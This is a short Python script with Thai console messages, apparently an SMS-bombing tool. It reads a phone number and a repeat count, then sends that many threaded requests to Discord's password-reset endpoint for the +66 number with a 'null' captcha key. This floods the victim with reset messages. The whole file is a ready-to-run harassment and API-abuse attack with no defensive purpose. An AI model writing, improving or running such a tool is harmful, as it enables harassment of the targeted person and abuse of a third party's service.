from requests import post, Session
from re import search
from random import choice
from string import ascii_uppercase, digits
from concurrent.futures import ThreadPoolExecutor
import asyncio
import threading
import requests
import os



os.system("clear")
phone = int(input("Phone : "))
amount = int(input("Amount : "))


def spam1():
	url = "https://discord.com/api/v9/auth/forgot"
	data = {"login": f"+66{phone}","captcha_key": "null"}
	r = requests.post(url, json=data)
	print("สถานะการร้องขอ api : ", r.status_code)
	
	

def run(phone, amount):
	for _ in range(int(amount)):
		threading.Thread(target=spam1).start()
		
def main():
	
	if phone < 1000000000:
		print(f"้เริ่มยิ่งที่เบอร์ : {phone}")
		print(f"จำนวนรอบ : {amount}")
		run(phone, amount)
	else:
		print("เบอร์ไม่ควรเกิน 10 หลัก")
		
		
start = input("Ready !!!")
start = main()
